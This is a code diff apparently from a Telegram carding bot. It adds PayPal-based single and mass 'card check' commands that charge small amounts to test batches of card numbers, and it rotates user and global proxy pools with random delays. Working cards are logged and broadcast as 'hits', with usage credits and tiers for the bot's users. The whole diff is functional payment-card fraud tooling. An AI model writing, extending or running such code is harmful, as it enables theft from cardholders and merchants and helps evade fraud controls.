+    can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+
+    try:
+        await message.delete()
+    except Exception:
+        pass
+
+    await _paypal_key_mass_logic(update, context, cards)
+
+
+async def _paypal_key_mass_logic(update: Update, context: ContextTypes.DEFAULT_TYPE,
+                                  cards: List[str]):
+    u_id = update.effective_user.id
+    message = update.effective_message
+    total = len(cards)
+
+    print(f"\n{'='*80}\n🚀 [PPK MASS] user={u_id} cards={total}\n{'='*80}")
+
+    session_id = create_session(u_id, "PayPal", total)
+
+    stats = {"charged": 0, "approved": 0, "declined": 0, "errors": 0,
+             "total": total, "processed": 0}
+    start_time = time.time()
+
+    approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+    charged_emoji  = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+    dead_emoji     = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+    errors_emoji   = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
+
+    progress_msg = await message.reply_text(
+        f"<b>Gateway</b> ➛ {PAYPAL_KEY_LABEL}\n"
+        f"<b>Status</b> ➛ STARTING...\n"
+        f"<b>Checked</b> ➛ 0/{total}\n"
+        f"<b>Charged</b> ➛ 0 {charged_emoji}\n"
+        f"<b>Approved</b> ➛ 0 {approved_emoji}\n"
+        f"<b>Declined</b> ➛ 0 {dead_emoji}\n"
+        f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
+        f"<b>Time</b> ➛ 0s",
+        parse_mode=ParseMode.HTML,
+    )
+
+    tier = user_manager.get_tier(u_id)
+    CONCURRENCY = {"free": 1, "premium": 1, "ultimate": 5, "admin": 5}.get(tier, 2)
+
+    sem = asyncio.Semaphore(CONCURRENCY)
+    lock = asyncio.Lock()
+    processed = 0
+    proxy_index = 0
+
+    # ── 3-tier user_proxies build (for rotation) ─────────────────────────
+    user_proxies: List[str] = []
+    if user_manager.can_use_proxy(u_id):
+        if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
+            user_proxies = list(autosopi_proxy_tracker.working_proxies[u_id])
+        if not user_proxies:
+            raw = proxy_manager.user_proxies.get(u_id, [])
+            if raw:
+                user_proxies = list(raw)
+        if not user_proxies and global_proxy_pool.enabled and global_proxy_pool.proxies:
+            user_proxies = list(global_proxy_pool.proxies)
+
+    print(f"🔌 [PPK Mass] Proxies for rotation: {len(user_proxies)}")
+
+    amount = context.user_data.get("payment_amount", PAYPAL_KEY_AMOUNT)
+
+    try:
+        paypal_key_active_tasks[u_id] = True
+
+        async def update_progress(cur: int, force: bool = False):
+            if not force and cur > 0 and cur < total and cur % 5 != 0:
+                return
+            elapsed = int(time.time() - start_time)
+            m, s = elapsed // 60, elapsed % 60
+            tstr = f"{m}m {s}s" if m else f"{s}s"
+            text = (
+                f"<b>Gateway</b> ➛ {PAYPAL_KEY_LABEL}\n"
+                f"<b>Status</b> ➛ PROCESSING {cur}/{total}\n"
+                f"<b>Checked</b> ➛ {cur}/{total}\n"
+                f"<b>Charged</b> ➛ {stats['charged']} {charged_emoji}\n"
+                f"<b>Approved</b> ➛ {stats['approved']} {approved_emoji}\n"
+                f"<b>Declined</b> ➛ {stats['declined']} {dead_emoji}\n"
+                f"<b>Errors</b> ➛ {stats['errors']} {errors_emoji}\n"
+                f"<b>Time</b> ➛ {tstr}"
+            )
+            try:
+                await progress_msg.edit_text(text, parse_mode=ParseMode.HTML)
+            except Exception:
+                pass
+
+        async def process_one(card: str, idx: int):
+            nonlocal processed, proxy_index
+            async with sem:
+                await asyncio.sleep(random.uniform(0.1, 0.3))
+
+                proxy_str = None
+                if user_proxies:
+                    proxy_str = user_proxies[proxy_index % len(user_proxies)]
+                    proxy_index += 1
+                    print(f"🔌 [PPK Mass] Card #{idx+1} proxy: {mask_proxy(proxy_str)}")
+
+                res = await check_card_paypal_key(card, str(amount), proxy_str)
+                bin_info = await get_bin_info(card)
+                cat = res.get("status_category", "unknown")
+
+                async with lock:
+                    processed += 1
+                    if cat == "charged":
+                        stats["charged"] += 1
+                        stats["approved"] += 1
+                    elif cat == "approved":
+                        stats["approved"] += 1
+                    elif cat == "declined":
+                        stats["declined"] += 1
+                    else:
+                        stats["errors"] += 1
+
+                    if processed % 5 == 0 or processed == total:
+                        await update_progress(processed, force=(processed == total))
+
+                if cat in ("charged", "approved"):
+                    ui, _ = format_paypal_key_response(res, card, bin_info, str(amount))
+                    try:
+                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+                    except Exception:
+                        pass
+
+                    await save_hit_to_file(
+                        card=card, gateway=PAYPAL_KEY_LABEL,
+                        response=res.get("message", "Approved"),
+                        price=f"${amount}",
+                        bin_info=bin_info, user_id=u_id, user_tier=tier,
+                    )
+
+                    if cat == "charged":
+                        user_data = user_manager.get_user(u_id)
+                        await send_hit_notification(
+                            context=context, gateway=PAYPAL_KEY_LABEL,
+                            card=card, response=res.get("message", "Charged"),
+                            price=f"${amount}",
+                            user=user_data, bin_info=bin_info,
+                            status_category="charged",
+                        )
+                        user_manager.increment_hits(u_id)
+
+                user_manager.increment_checks(u_id, 1)
+                return res
+
+        tasks = [asyncio.create_task(process_one(c, i)) for i, c in enumerate(cards)]
+        for coro in asyncio.as_completed(tasks):
+            if u_id not in paypal_key_active_tasks:
+                break
+            try:
+                await coro
+            except Exception as e:
+                print(f"❌ [PPK Mass] task err: {e}")
+                async with lock:
+                    stats["errors"] += 1
+
+        if u_id in paypal_key_active_tasks:
+            total_time = time.time() - start_time
+            m, s = int(total_time // 60), int(total_time % 60)
+
+            await update_progress(total, force=True)
+
+            summary = (
+                f"🏁 <b>PayPal Mass Check Complete</b>\n\n"
+                f"{charged_emoji} <b>Charged</b> ➛ {stats['charged']}\n"
+                f"{approved_emoji} <b>Approved</b> ➛ {stats['approved']}\n"
+                f"{dead_emoji} <b>Declined</b> ➛ {stats['declined']} (Hidden)\n"
+                f"{errors_emoji} <b>Errors</b> ➛ {stats['errors']}\n"
+                f"📝 <b>Total</b> ➛ {total}\n"
+                f"⏱️ <b>Time</b> ➛ {m}m {s}s"
+            )
+            try:
+                await message.reply_text(summary, parse_mode=ParseMode.HTML)
+            except Exception:
+                pass
+
+    except Exception as e:
+        print(f"❌ [PPK Mass] {e}\n{traceback.format_exc()}")
+        try:
+            await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
+        except Exception:
+            pass
+    finally:
+        paypal_key_active_tasks.pop(u_id, None)
+        print(f"🏁 [PPK Mass] done for user {u_id}")
+        
+        
+        
+        
+        
+async def ppk_keys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show PayPal key pool health — /ppkkeys (admin only)"""
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Admin only.")
+        return
+
+    lines = ["🔑 <b>PayPal Key Pool</b>\n"]
+    for i, k in enumerate(PAYPAL_KEY_POOL, 1):
+        status = "✅" if k["enabled"] else "❌"
+        token_state = "🟢" if k.get("token") and time.time() < k.get("token_expires", 0) else "⚪"
+        lines.append(
+            f"{status} <b>{k['name']}</b>\n"
+            f"   ├─ Success: {k.get('success_count', 0)}\n"
+            f"   ├─ Fails:   {k.get('fail_count', 0)}\n"
+            f"   ├─ Token:   {token_state}\n"
+            f"   └─ ID:      <code>{k['client_id'][:20]}…</code>"
+        )
+    await update.message.reply_text("\n\n".join(lines), parse_mode=ParseMode.HTML)
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
 # ============ PAYMENT VERIFICATION SYSTEM ============
@@ -70676,13 +71722,7 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         '/mch':  'ezycourse',
         '/ch':   'ezycourse',
 
-        # PayPal
-        '/ppmc':      'paypal',
-        '/ppmcheck':  'paypal',
-        '/mpp':       'paypal',
-        '/pp':        'paypal',
-        '/mpp1':      'princess',
-        '/pp1':       'princess',
+
 
         # B3Charged
         '/mb3':      'b3charged',
@@ -70750,13 +71790,7 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         '/ct':   'stripe_pl',
         '/mct':  'stripe_pl',
 
-        # PayPal Donation
-        '/pa':   'paypal_donation',
-        '/mpa':  'paypal_donation',
-
-        # PayPal Donation $0.50
-        '/p':    'paypal_donation_50',
-        '/mp':   'paypal_donation_50',
+    
 
         # United Way
         '/s':    'united_way_stripe',
@@ -70773,6 +71807,9 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         # Stripe Check (chk)
         '/mchk':  'stripe_chk',
         '/chk':   'stripe_chk',
+        
+        '/mpp':       'paypal_key',
+        '/pp':        'paypal_key', 
     }
 
     gateway = gateway_map.get(command)
@@ -70931,8 +71968,9 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
             context.args = [card]
             asyncio.create_task(single_check_stripe_sk(update, context))
 
-        elif gateway == 'paypal':
-            asyncio.create_task(single_check_paypal_with_gif(update, context, card))
+        elif gateway == 'paypal_key':
+            context.args = [card]
+            asyncio.create_task(paypal_key_single_command(update, context))
 
         elif gateway == 'princess':
             context.args = [card]
@@ -71076,8 +72114,8 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         asyncio.create_task(
             _stripe_sk_mass_logic(update, context, cards, _sk_load_secret(), progress_msg)
         )
-    elif gateway == 'paypal':
-        asyncio.create_task(paypal_mass_check_with_pool(update, context, cards, progress_msg, gateway_type="paypal"))
+    elif gateway == 'paypal_key':
+        asyncio.create_task(_paypal_key_mass_logic(update, context, cards))
     elif gateway == 'princess':
         asyncio.create_task(paypal_mass_check_with_pool(update, context, cards, progress_msg, gateway_type="princess"))
     elif gateway == 'b3charged':
@@ -78244,8 +79282,7 @@ def main():
     # ============ DOCUMENT HANDLER ============
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     
-    # ============ MASS CHECK PAYPAL 3POOL ============
-    app.add_handler(CommandHandler("mpp3", mass_check_paypal_3pool))
+
     
     
     
@@ -78311,6 +79348,12 @@ def main():
 
     app.add_handler(CallbackQueryHandler(verify_membership_callback, pattern='^verify_membership$'))
     app.add_handler(CallbackQueryHandler(autosopi_get_cards_callback, pattern="^autosopi_get_"))
+    
+    
+    app.add_handler(CommandHandler("pp",  paypal_key_single_command))
+    app.add_handler(CommandHandler("mpp", paypal_key_mass_command))
+    
+    app.add_handler(CommandHandler("ppkkeys", ppk_keys_command))
     
 
     
